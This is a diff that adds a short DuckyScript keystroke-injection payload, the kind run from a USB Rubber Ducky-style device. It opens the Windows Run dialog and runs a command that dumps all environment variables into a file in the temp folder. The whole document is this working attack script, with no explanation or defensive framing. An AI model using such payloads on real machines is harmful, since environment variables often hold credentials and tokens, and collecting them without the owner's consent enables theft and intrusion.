@@ -1,0 +1,6 @@
+REM Windows Environment Variables Dump
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c "set > %TEMP%\env_vars.txt"
+ENTER
